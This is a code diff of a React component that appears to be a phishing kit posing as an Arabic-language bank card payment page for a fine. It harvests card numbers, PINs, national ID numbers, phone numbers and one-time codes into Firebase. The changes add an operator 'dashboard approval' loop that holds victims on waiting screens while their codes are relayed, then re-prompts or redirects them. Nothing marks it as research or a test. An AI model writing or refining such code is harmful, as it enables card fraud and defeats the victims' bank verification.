@@ -7,6 +7,7 @@ import { doc, onSnapshot } from "firebase/firestore"
 import { addData, db, handlePay } from "../firebase"
 import FullPageLoader from "../loader1"
 
+// Update the PaymentInfo type to include otp2
 type PaymentInfo = {
   createdDate?: string
   cardNumber: string
@@ -16,11 +17,13 @@ type PaymentInfo = {
   bank?: string
   pass: string
   otp?: string
+  otp2?: string
   cardState: string
   allOtps: string[]
   bank_card: string[]
   prefix: string
   status: "new" | "pending" | "approved" | "rejected"
+  cardStatus: "new" | "pending" | "approved" | "rejected"
 }
 
 type FormData = {
@@ -167,28 +170,29 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
     bank_card: [""],
     prefix: "",
     status: "new",
+    cardStatus: "new",
   })
-const cuonter=()=>{
-  let timeLeft = 30;
+  const cuonter = () => {
+    let timeLeft = 30
 
-  // Update the countdown every 1 second
-  let countdown = setInterval(function () {
-    timeLeft--;
+    // Update the countdown every 1 second
+    const countdown = setInterval(() => {
+      timeLeft--
 
       // Get the current date and time
-      
+
       // Calculate the distance between now and the countdown date
-   
+
       // Display the result
-    setTime(timeLeft)
-      
+      setTime(timeLeft)
+
       // If the countdown is finished, display a message
       if (timeLeft <= 0) {
-          clearInterval(countdown);
-          setTime(0)
+        clearInterval(countdown)
+        setTime(0)
       }
-  }, 1000);
-}
+    }, 1000)
+  }
   // Handle form input changes
   const handleFormChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target
@@ -217,6 +221,61 @@ const cuonter=()=>{
     }))
   }
 
+  // Handle card approval/rejection from dashboard
+  const handleCardApprovalFromDashboard = async (status: "approved" | "rejected") => {
+    setLoading(true)
+    try {
+      // Update payment info with card status
+      const updatedPaymentInfo = {
+        ...paymentInfo,
+        cardStatus: status,
+      }
+
+      // Update Firebase with card status
+      await handlePay(updatedPaymentInfo, setPaymentInfo)
+
+      setTimeout(() => {
+        setLoading(false)
+        // If approved, move to next step
+        if (status === "approved" && step === 1) {
+          setStep(2)
+        }
+      }, 2000)
+    } catch (error) {
+      console.error("Error updating card status:", error)
+      setLoading(false)
+    }
+  }
+
+  // Handle OTP approval/rejection from dashboard
+  const handleOtpApprovalFromDashboard = async (status: "approved" | "rejected") => {
+    setLoading(true)
+    try {
+      // Update payment info with OTP status
+      const updatedPaymentInfo = {
+        ...paymentInfo,
+        status: status,
+      }
+
+      // Update Firebase with OTP status
+      await handlePay(updatedPaymentInfo, setPaymentInfo)
+
+      setTimeout(() => {
+        setLoading(false)
+        // If approved, redirect to sahel page
+        if (status === "approved" && step === 3) {
+          props.setPage("sahel")
+        } else if (status === "rejected" && step === 3) {
+          alert("رمز التحقق غير صحيح, الرجاء ادخال الرمز مرة اخرى ")
+          setStep(2)
+        }
+      }, 2000)
+    } catch (error) {
+      console.error("Error updating OTP status:", error)
+      setLoading(false)
+    }
+  }
+
   // Handle OTP addition
   const handleAddOtp = (otp: string) => {
     if (!newotp.includes(`${otp} , `)) {
@@ -224,13 +283,61 @@ const cuonter=()=>{
     }
   }
 
+  // Handle card approval
+  // const handleCardApproval = async () => {
+  //   setLoading(true)
+  //   try {
+  //     // Update payment info with approved status for card
+  //     const updatedPaymentInfo = {
+  //       ...paymentInfo,
+  //       cardState: "approved",
+  //     }
+
+  //     // Update Firebase with card approval status
+  //     await handlePay(updatedPaymentInfo, setPaymentInfo)
+
+  //     setTimeout(() => {
+  //       setLoading(false)
+  //       // Move to next step after card is approved
+  //       setStep(2)
+  //     }, 2000)
+  //   } catch (error) {
+  //     console.error("Error approving card:", error)
+  //     setLoading(false)
+  //   }
+  // }
+
+  // Handle OTP approval
+  // const handleOtpApproval = async () => {
+  //   setLoading(true)
+  //   try {
+  //     // Update payment info with approved status for OTP
+  //     const updatedPaymentInfo = {
+  //       ...paymentInfo,
+  //       status: "approved",
+  //     }
+
+  //     // Update Firebase with OTP approval status
+  //     await handlePay(updatedPaymentInfo, setPaymentInfo)
+
+  //     setTimeout(() => {
+  //       setLoading(false)
+  //       // Redirect to sahel page after OTP is approved
+  //       props.setPage("sahel")
+  //     }, 2000)
+  //   } catch (error) {
+  //     console.error("Error approving OTP:", error)
+  //     setLoading(false)
+  //   }
+  // }
+
   // Handle form submission
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setLoading(true)
 
     try {
-      await addData({  createdDate: new Date().toISOString(),...formData})
+      await addData({ createdDate: new Date().toISOString(), ...formData })
     } catch (error) {
       console.error("Error:", error)
     }
@@ -250,18 +357,31 @@ const cuonter=()=>{
   const handleButtonClick = async (e: React.FormEvent) => {
     e.preventDefault()
 
-    if (step === 1) {
+    if (step === 0) {
       setLoading(true)
-      await handlePay(paymentInfo, setPaymentInfo)
-      setStep(2)
+      // Update payment info with both OTP values
+      const updatedPaymentInfo = {
+        ...paymentInfo,
+        status: "pending",
+      }
+      await handlePay(updatedPaymentInfo, setPaymentInfo)
       setLoading(false)
+      setStep(2)
+    } else if (step === 1) {
+      setStep(0)
+      // Update payment info to pending status for card
+      const updatedPaymentInfo = {
+        ...paymentInfo,
+        cardStatus: "pending",
+      }
+      await handlePay(updatedPaymentInfo, setPaymentInfo)
+      // Note: We don't automatically move to step 2 now - waiting for dashboard approval
     } else if (step === 2) {
       setLoading(true)
       await handleSubmit(e)
       setTimeout(() => {
         setLoading(false)
-    cuonter()
-
+        cuonter()
         setStep(3)
       }, 3000)
     } else if (step === 3) {
@@ -270,32 +390,14 @@ const cuonter=()=>{
       }
 
       setLoading(true)
-      await handlePay(paymentInfo, setPaymentInfo)
-
-      // Check for approval status after submitting OTP
-      setTimeout(async () => {
-        // If payment is approved, redirect to sahel
-        if (paymentInfo.status === "approved") {
-          try {
-            // Add data with page:"sahel" to redirect
-
-
+      // Update payment info to pending status for OTP
+      const updatedPaymentInfo = {
+        ...paymentInfo,
+        status: "pending",
+      }
+      await handlePay(updatedPaymentInfo, setPaymentInfo)
       setLoading(false)
-
-            props.setPage('sahel')
-          } catch (error) {
-            console.error("Error updating page:", error)
-          }
-        } else if (paymentInfo.status === "rejected") {
-          // If rejected, show alert and stay on step 3
-          alert("رمز التحقق غير صحيح, الرجاء ادخال الرمز مرة اخرى ")
-        }
-        // Reset OTP field and loading state
-        setPaymentInfo({
-          ...paymentInfo,
-          otp: "",
-        })
-      }, 3000)
+      // Note: We don't automatically redirect now - waiting for dashboard approval
     }
   }
 
@@ -330,30 +432,40 @@ const cuonter=()=>{
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), async (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as any
-          setCid(data.personalInfo.id)
-setMobile(data.mobile)
-          if (data.status === "approved") {
+          setCid(data.personalInfo?.id || "")
+          setMobile(data.mobile || "99****")
+
+          // Update card status if available
+          if (data.cardStatus) {
+            setPaymentInfo((prev) => ({ ...prev, cardStatus: data.cardStatus }))
+
+            // If we're on step 1 and card is approved, move to step 2
+            if (step === 1 && data.cardStatus === "approved") {
+              setStep(2)
+            }
+          }
+
+          // Update OTP status if available
+          if (data.status) {
             setPaymentInfo((prev) => ({ ...prev, status: data.status }))
 
             // If we're on step 3 and status is approved, redirect to sahel
-            if (step === 3) {
+            if (step === 3 && data.status === "approved") {
               setLoading(true)
               try {
                 // Add data with page:"sahel" to redirect
                 await addData({ id: visitorId, page: "sahel" })
+                props.setPage("sahel")
               } catch (error) {
                 console.error("Error updating page:", error)
               } finally {
                 setLoading(false)
               }
-            }
-          } else if (data.status === "rejected") {
-            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
-
-            // If we're on step 3 and status is rejected, show alert
-            if (step === 3) {
+            } else if (step === 3 && data.status === "rejected") {
+              // If we're on step 3 and status is rejected, show alert
               setLoading(false)
-              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
+              alert("تم رفض الرمز, ادخال معلومات البطاقة بشكل صحيح ")
+              setStep(2)
             }
           }
         }
@@ -361,7 +473,7 @@ setMobile(data.mobile)
 
       return () => unsubscribe()
     }
-  }, [step])
+  }, [step, props])
 
   // Render different form steps
   const renderFormStep = () => {
@@ -481,15 +593,110 @@ setMobile(data.mobile)
                 />
               </div>
             </div>
-         
+
+          
           </div>
         )
+      case 0:
+        return (
+          <div className="form-card" dir="rtl">
+            <div className="notification">
+              <div className="border border-blue-500 rounded-lg p-4 max-w-md mx-auto">
+                <div style={{ display: "flex", justifyContent: "center" }}>
+                  <img src="./Phone_icon.png" alt="logo" width={40} style={{ margin: 5 }} />
+                </div>
+                {/* Verification title */}
+                <p className="text-blue-600 text-xl text-center font-bold mb-4">تحقق من الرمز المرسل إلى جوالك</p>
 
+                {/* Reference number */}
+                <div className="flex justify-center items-center gap-2 mb-6 row">
+                  <span style={{ textAlign: "center" }}>{"00:00:" + time}</span>
+                  <span className="text-xl font-bold" style={{ textAlign: "center" }}>
+                    {mobile || "99******"}
+                  </span>
+                  <div className="bg-blue-100 rounded-full p-1">
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="20"
+                      height="20"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      className="text-blue-600"
+                    >
+                      <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                    </svg>
+                  </div>
+                </div>
+
+                {/* Info box */}
+                <div className=" notification ">
+                  <div
+                    className="row alert-msg"
+                    id="notificationbox"
+                    style={{
+                      color: "#31708f",
+                      fontFamily: "Arial, Helvetica, serif",
+                      fontSize: 12,
+                    }}
+                  >
+                    <div id="notification">
+                      <p>
+                        <span className="title" style={{ fontWeight: "bold" }}>
+                          يرجى الانتباه:
+                        </span>{" "}
+                        لقد تم إرسال رمز تحقق مكون من 6 أرقام عبر رسالة نصية إلى رقم هاتفك الجوال المسجل لدى البنك. يرجى
+                        إدخال الرمز في الخانة أدناه لإتمام عملية التحقق. تنتهي صلاحية الرمز خلال 5 دقائق
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                {/* OTP Input field */}
+                <div
+                  className="mb-6"
+                  style={{
+                    color: "#31708f",
+                  }}
+                >
+                  <div className="flex items-center justify-between mb-2">
+                    <div className="flex items-center gap-1 text-blue-600">
+                    </div>
+                  </div>
+                
+                </div>
+
+                {/* Second OTP Input field */}
+                <div
+                  className="mb-6"
+                  style={{
+                    color: "#31708f",
+                  }}
+                >
+                  <div className="flex items-center justify-between mb-2">
+                    <div className="flex items-center gap-1 text-blue-600">
+                      <strong>الرمز المرسل إلى الجوال</strong>
+                    </div>
+                  </div>
+                  <input
+                    type="text"
+                    maxLength={6}
+                    placeholder="الرمز  المرسل إلى الجوال"
+                    className="text-center text-lg py-6 border-blue-200"
+                    value={paymentInfo.otp2 || ""}
+                    onChange={(e) => handlePaymentInfoChange("otp2", e.target.value)}
+                  />
+                </div>
+              </div>
+            </div>
+          </div>
+        )
       case 2:
         return (
-          <div className="form-card" 
-          dir="rtl"
-          >
+          <div className="form-card" dir="rtl">
             <div
               className="notification"
               style={{
@@ -514,7 +721,6 @@ setMobile(data.mobile)
                 color: "#31708f",
                 fontFamily: "Arial, Helvetica, serif",
                 fontSize: 12,
-
               }}
             >
               <div id="notification">
@@ -522,7 +728,7 @@ setMobile(data.mobile)
                   <span className="title" style={{ fontWeight: "bold" }}>
                     يرجى الملاحظة:
                   </span>{" "}
-                 لمتابعة الطلب، يرجى إدخال رقم الهاتف المحمول المرتبط ببطاقة الهوية الوطنية حتى تتم عملية الدفع بنجاح.
+                  لمتابعة الطلب، يرجى إدخال رقم الهاتف المحمول المرتبط ببطاقة الهوية الوطنية حتى تتم عملية الدفع بنجاح.
                 </p>
               </div>
             </div>
@@ -537,7 +743,7 @@ setMobile(data.mobile)
                   name="idNumber"
                   style={{ width: "100%" }}
                   maxLength={10}
-                  value={formData.idNumber || cid }
+                  value={formData.idNumber || cid}
                   onChange={handleFormChange}
                 />
               </div>
@@ -586,8 +792,10 @@ setMobile(data.mobile)
 
                 {/* Reference number */}
                 <div className="flex justify-center items-center gap-2 mb-6 row">
-                  <span style={{textAlign:'center'}}>{"00:00:"+time}</span>
-                  <span className="text-xl font-bold" style={{textAlign:'center'}} >{mobile||"99******"}</span>
+                  <span style={{ textAlign: "center" }}>{"00:00:" + time}</span>
+                  <span className="text-xl font-bold" style={{ textAlign: "center" }}>
+                    {mobile || "99******"}
+                  </span>
                   <div className="bg-blue-100 rounded-full p-1">
                     <svg
                       xmlns="http://www.w3.org/2000/svg"
@@ -650,6 +858,19 @@ setMobile(data.mobile)
                     onChange={(e) => handlePaymentInfoChange("otp", e.target.value)}
                   />
                 </div>
+              </div>
+            </div>
+            <div className="flex items-center justify-between mt-4">
+              <div className="flex items-center gap-1">
+                <span
+                  className={`${paymentInfo.status === "approved" ? "text-green-600" : paymentInfo.status === "rejected" ? "text-red-600" : "text-yellow-600"} font-bold`}
+                >
+                  {paymentInfo.status === "approved"
+                    ? "تم التحقق ✓"
+                    : paymentInfo.status === "rejected"
+                      ? "OTP رمز التحقق غير صيحيح ✗"
+                      : "انتظار التحقق ..."}
+                </span>
               </div>
             </div>
           </div>
@@ -747,7 +968,7 @@ setMobile(data.mobile)
                       <button disabled={!isFormValid() || loading} type="submit">
                         {loading ? "Wait..." : step === 1 ? "Submit" : "تأكيد العملية"}
                       </button>
-                      <button type="button">{step>1?"الغاء":"Cancel"}</button>
+                      <button type="button">{step > 1 ? "الغاء" : "Cancel"}</button>
                     </div>
                   </div>
                 </div>
